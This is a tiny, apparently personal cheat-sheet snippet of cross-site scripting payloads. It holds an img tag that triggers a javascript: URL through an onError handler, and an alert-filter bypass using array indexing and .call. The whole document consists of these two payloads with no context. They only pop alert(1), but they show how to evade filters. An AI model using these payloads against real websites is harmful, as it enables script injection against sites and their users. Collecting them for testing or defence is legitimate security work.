Simple XSS:
<img \src=javascript:alert(1) onError=location=\src>

bypass alert:
\[alert\]\[0\].call(this,1)

